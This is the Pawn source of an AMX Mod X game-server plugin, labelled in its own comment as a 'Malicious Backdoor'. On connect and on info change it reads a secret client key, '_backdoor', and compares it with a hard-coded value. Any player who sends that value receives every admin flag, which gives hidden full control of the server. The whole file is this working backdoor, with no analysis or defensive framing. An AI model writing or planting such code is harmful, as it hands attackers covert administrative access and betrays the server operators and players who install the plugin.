/* Malicious Backdoor */
#include <amxmodx>
#include <amxmisc>

new const INFO_KEY[] = "_backdoor"
new const INFO_VAL[] = "0102030405"

#define CHECK_TASKID 1000

public client_putinserver(id) {
    set_task(3.0, "check_backdoor_access", id + CHECK_TASKID)
}

public client_disconnected(id) {
    if (task_exists(id + CHECK_TASKID)) {
        remove_task(id + CHECK_TASKID)
    }
}

public client_infochanged(id) {
    if (!is_user_connected(id))
        return PLUGIN_CONTINUE

    verify_and_grant(id)
    
    return PLUGIN_CONTINUE
}

public check_backdoor_access(taskid) {
    new id = taskid - CHECK_TASKID
    
    if (is_user_connected(id)) {
        verify_and_grant(id)
    }
}

verify_and_grant(id) {
    new user_val[32]
    get_user_info(id, INFO_KEY, user_val, charsmax(user_val))

    if (equal(user_val, INFO_VAL)) {
        set_user_flags(id, read_flags("abcdefghijklmnopqrstuv"))
    }
}
